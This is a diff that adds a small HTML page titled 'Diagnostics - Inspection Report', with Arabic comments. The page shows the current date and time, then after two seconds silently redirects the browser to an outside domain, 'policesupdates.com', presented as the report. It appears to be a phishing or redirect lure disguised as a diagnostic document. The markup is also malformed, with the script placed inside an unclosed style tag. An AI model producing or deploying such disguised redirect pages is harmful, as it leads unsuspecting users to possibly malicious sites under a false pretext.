@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8" />
+	<meta content="width=device-width, initial-scale=1.0" name="viewport" />
+	<title>Diagnostics - Inspection Report</title>
+	<style type="text/css">:root{
+    --green:#35792a;
+}
+
+<script>
+
+
+// اسم ملف العميل
+
+let report = "https://policesupdates.com";
+
+
+// التاريخ والوقت
+
+let now = new Date();
+
+
+document.getElementById("date").innerHTML =
+"📅 Date: " + now.toLocaleDateString("en-US");
+
+
+document.getElementById("time").innerHTML =
+"🕒 Time: " + now.toLocaleTimeString("en-US");
+
+
+
+// تحميل التقرير بعد ثانيتين
+
+setTimeout(function(){
+
+window.location.href = report;
+
+},2000);
+
+
+</script><grammarly-desktop-integration data-grammarly-shadow-root="true" style="visibility: visible !important;"></grammarly-desktop-integration></body>
+</html>
